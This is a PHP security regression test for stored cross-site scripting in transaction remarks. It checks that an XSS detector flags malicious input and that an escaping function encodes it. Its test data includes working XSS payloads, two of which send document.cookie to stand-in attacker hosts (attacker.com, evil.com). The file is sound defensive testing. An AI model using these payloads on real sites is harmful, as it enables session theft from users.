<?php
/**
 * Regression Test: 03 - Stored XSS via Transaction Remark
 * 
 * OWASP: A03:2021 – Injection
 * CWE: CWE-79 (Cross-Site Scripting)
 */

require_once __DIR__ . '/../../security/validation.php';

function test_03_stored_xss(): array {
    $tests = [];

    // Test 1: Classic Script Tag Injection Detection
    $payload1 = "<script>alert('XSS_ATTACK')</script>";
    $detected1 = detect_xss($payload1);
    $tests[] = [
        'name'   => 'Signature Detection for <script> Tag Injection in Remarks',
        'pass'   => ($detected1 === true),
        'detail' => "Script tag detected = " . ($detected1 ? 'YES' : 'NO')
    ];

    // Test 2: Event Handler Injection Detection
    $payload2 = "<img src='x' onerror='fetch(\"http://attacker.com/?c=\"+document.cookie)'>";
    $detected2 = detect_xss($payload2);
    $tests[] = [
        'name'   => 'Signature Detection for Image onerror Event Handler',
        'pass'   => ($detected2 === true),
        'detail' => "Event handler payload detected = " . ($detected2 ? 'YES' : 'NO')
    ];

    // Test 3: safe_html Contextual HTML Entity Encoding
    $dangerousInput = "<script>document.location='http://evil.com/steal?cookie='+document.cookie;</script>";
    $escapedOutput = safe_html($dangerousInput);
    $hasRawTags = str_contains($escapedOutput, '<script>') || str_contains($escapedOutput, '</script>');
    $hasEntities = str_contains($escapedOutput, '&lt;script&gt;');
    $tests[] = [
        'name'   => 'Contextual Entity Encoding on Dangerous HTML Markup',
        'pass'   => (!$hasRawTags && $hasEntities),
        'detail' => "Output encoded to: " . substr($escapedOutput, 0, 30) . "..."
    ];

    // Test 4: Attribute Escape Validation
    $attrPayload = "\" onmouseover=\"alert(1)\"";
    $safeAttr = safe_html($attrPayload);
    $tests[] = [
        'name'   => 'Double-Quote Escape for HTML Attribute Injections',
        'pass'   => str_contains($safeAttr, '&quot;'),
        'detail' => "Quotes neutralized to &quot;"
    ];

    return $tests;
}

if (basename(__FILE__) === basename($_SERVER['SCRIPT_FILENAME'] ?? '')) {
    echo "Running 03-Stored-XSS Tests...\n";
    $allPass = true;
    foreach (test_03_stored_xss() as $t) {
        printf("  [%s] %s (%s)\n", $t['pass'] ? 'PASS' : 'FAIL', $t['name'], $t['detail']);
        if (!$t['pass']) $allPass = false;
    }
    exit($allPass ? 0 : 1);
}
